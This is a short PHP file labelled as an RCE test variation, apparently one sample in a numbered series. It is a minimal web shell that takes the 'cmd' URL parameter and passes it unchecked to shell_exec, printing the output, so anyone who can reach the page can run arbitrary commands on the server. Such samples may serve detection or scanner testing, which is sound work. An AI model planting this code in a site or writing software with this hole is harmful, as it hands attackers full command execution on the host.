<?php
// RCE test variation #133
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>